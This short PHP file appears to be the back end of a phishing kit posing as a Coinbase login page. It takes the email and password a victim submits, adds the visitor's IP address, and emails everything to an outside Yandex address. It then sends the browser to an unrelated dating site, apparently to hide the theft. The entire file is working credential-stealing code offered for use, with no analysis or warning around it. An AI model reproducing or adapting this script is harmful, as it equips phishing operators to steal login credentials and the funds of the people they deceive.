<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || coinbxe log GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="yeancah@yandex.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com");
?>
